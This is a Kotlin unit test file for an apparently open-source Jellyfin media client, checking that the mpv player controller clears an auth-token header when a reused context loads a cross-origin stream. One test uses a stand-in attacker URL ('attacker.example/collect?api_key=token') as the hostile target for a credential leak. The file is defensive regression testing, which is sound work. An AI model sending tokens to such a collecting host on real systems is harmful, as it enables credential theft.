// SPDX-License-Identifier: MPL-2.0

package com.jellyscope.core.playback

import com.jellyscope.core.domain.model.Session
import com.jellyscope.core.domain.playback.PlaybackPlan
import com.jellyscope.core.domain.playback.ProgressReportingPolicy
import com.jellyscope.core.domain.playback.StreamMode
import com.sun.jna.Pointer
import com.sun.jna.ptr.PointerByReference
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlin.test.Test
import kotlin.test.assertEquals

// Regression for the F-P1-04 mpv credential leak: `http-header-fields` is a global
// mpv option on a reused controller context. A trusted (same-origin) prepare must
// install the token, and a following cross-origin prepare must CLEAR it — otherwise
// the stale Authorization header leaks to a server-supplied external URL.
class MpvCredentialHeaderTest {
    @Test
    fun sameOriginMainUrlInstallsModernTokenOnlyAuthorizationHeader() {
        val lib = HeaderRecordingLibMpv()
        withController(lib) { controller ->
            controller.prepare(planFor("https://jellyfin.example/Videos/item-1/stream?api_key=token"), null)
            assertEquals("Authorization: MediaBrowser Token=\"token\"", lib.lastHttpHeaderFields())
        }
    }

    @Test
    fun crossOriginMainUrlAfterTrustedPrepareClearsTokenHeader() {
        val lib = HeaderRecordingLibMpv()
        withController(lib) { controller ->
            controller.prepare(planFor("https://jellyfin.example/Videos/item-1/stream?api_key=token"), null)
            assertEquals("Authorization: MediaBrowser Token=\"token\"", lib.lastHttpHeaderFields())

            // Same controller/context reused for a server-supplied cross-origin URL.
            controller.prepare(planFor("https://attacker.example/collect?api_key=token"), null)
            assertEquals("", lib.lastHttpHeaderFields())
        }
    }

    private fun withController(
        lib: HeaderRecordingLibMpv,
        block: (MpvPlayerController) -> Unit,
    ) {
        val scope = CoroutineScope(SupervisorJob() + Dispatchers.Default)
        val controller = MpvPlayerController(session, scope, lib)
        try {
            block(controller)
        } finally {
            controller.release()
            scope.cancel()
        }
    }

    private fun planFor(streamUrl: String): PlaybackPlan =
        PlaybackPlan(
            itemId = "item-1",
            mediaSourceId = "source-1",
            startPositionMs = 0L,
            streamMode = StreamMode.DirectPlay,
            streamUrl = streamUrl,
            progressReportingPolicy = ProgressReportingPolicy(10_000L),
        )

    private val session =
        Session(
            serverUrl = "https://jellyfin.example",
            serverId = "server-1",
            serverName = "Home",
            userId = "user-1",
            userName = "User",
            accessToken = "token",
            deviceId = "device-1",
        )
}

// Minimal LibMpv fake: records set_option_string, returns benign defaults elsewhere.
private class HeaderRecordingLibMpv : LibMpv {
    private val context = Pointer(1L)
    private val renderContext = Pointer(2L)
    private val options = mutableListOf<Pair<String, String>>()

    fun lastHttpHeaderFields(): String? =
        synchronized(options) {
            options.lastOrNull { (name, _) -> name == "http-header-fields" }?.second
        }

    override fun mpv_create(): Pointer = context

    override fun mpv_initialize(ctx: Pointer): Int = 0

    override fun mpv_terminate_destroy(ctx: Pointer) = Unit

    override fun mpv_error_string(error: Int): Pointer? = null

    override fun mpv_set_option_string(
        ctx: Pointer,
        name: String,
        data: String,
    ): Int {
        synchronized(options) { options += name to data }
        return 0
    }

    override fun mpv_set_property_string(
        ctx: Pointer,
        name: String,
        data: String,
    ): Int = 0

    override fun mpv_get_property(
        ctx: Pointer,
        name: String,
        format: Int,
        data: Pointer,
    ): Int = -1

    override fun mpv_get_property_string(
        ctx: Pointer,
        name: String,
    ): Pointer? = null

    override fun mpv_free(data: Pointer) = Unit

    override fun mpv_command(
        ctx: Pointer,
        args: Array<String?>,
    ): Int = 0

    override fun mpv_wait_event(
        ctx: Pointer,
        timeout: Double,
    ): Pointer? = null

    override fun mpv_render_context_create(
        res: PointerByReference,
        mpv: Pointer,
        params: Array<MpvRenderParam>,
    ): Int {
        res.value = renderContext
        return 0
    }

    override fun mpv_render_context_render(
        ctx: Pointer,
        params: Array<MpvRenderParam>,
    ): Int = 0

    override fun mpv_render_context_set_update_callback(
        ctx: Pointer,
        callback: LibMpv.MpvRenderUpdateFn?,
        callbackCtx: Pointer?,
    ) = Unit

    override fun mpv_render_context_update(ctx: Pointer): Long = 0L

    override fun mpv_render_context_free(ctx: Pointer) = Unit
}
